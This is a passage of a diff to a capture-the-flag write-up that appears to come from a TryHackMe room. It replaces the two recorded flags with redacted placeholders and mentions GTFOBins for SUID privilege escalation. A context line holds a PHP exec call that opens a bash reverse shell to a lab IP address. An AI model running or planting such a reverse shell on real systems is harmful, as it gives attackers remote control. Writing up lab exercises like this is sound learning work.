@@ -32,8 +32,8 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.96.163/1234 0>&1'");
 ```
 
 ## Flag
-- THM{y0u_g0t_a_sh3ll}
-- THM{pr1v1l3g3_3sc4l4t10n}
+- THM{redacted}
+- THM{redacted}
 
 ## Lessons Learned
 - We can use gtfobins.github.io to search for codes like getting permission for SUID using the shell for languages like python and its really useful. 
